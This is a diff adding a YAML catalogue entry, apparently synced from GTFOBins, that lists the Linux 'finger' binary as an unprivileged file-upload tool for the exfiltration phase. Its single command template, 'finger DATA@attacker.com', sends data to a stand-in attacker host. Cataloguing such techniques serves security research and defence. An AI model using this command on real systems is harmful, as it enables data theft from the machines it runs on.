@@ -1,0 +1,24 @@
+id: gtfobins/finger/upload/unprivileged
+type: binary
+platform: linux
+name: finger
+phases:
+- exfiltration
+capabilities:
+- file-upload
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: finger DATA@attacker.com
+  comment: The command hangs waiting for the remote peer to close the socket.
+references:
+- https://gtfobins.github.io/gtfobins/finger/
+tags:
+- linux
+- unix
+- gtfobins
